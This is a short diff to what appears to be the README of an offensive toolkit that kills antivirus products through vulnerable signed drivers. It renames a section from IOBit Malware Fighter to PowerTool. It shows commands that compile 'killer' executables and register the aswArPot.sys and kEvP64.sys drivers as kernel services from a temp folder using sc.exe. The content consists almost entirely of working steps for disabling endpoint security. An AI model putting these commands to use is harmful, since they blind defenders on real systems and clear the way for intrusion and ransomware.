@@ -13,11 +13,11 @@ x86_64-w64-mingw32-gcc -o avast_killer.exe avast_killer.c
 sc.exe create aswArPot.sys binPath= C:\windows\temp\aswArPot.bin type= kernel && sc.exe start aswArPot.sys
 ```
 
-## IOBit Malware Fighter
+## PowerTool 
 
 https://www.loldrivers.io/drivers/fe2f68e1-e459-4802-9a9a-23bb3c2fd331
 
 ```
-x86_64-w64-mingw32-gcc -o iobit_malwarefighter_killer.exe iobit_malwarefighter_killer.c 
+x86_64-w64-mingw32-gcc -o PowerTool_killer.exe PowerTool_killer.c 
 sc.exe create kEvP64.sys binPath= C:\windows\temp\kEvP64.bin type= kernel && sc.exe start kEvP64.sys
 ```
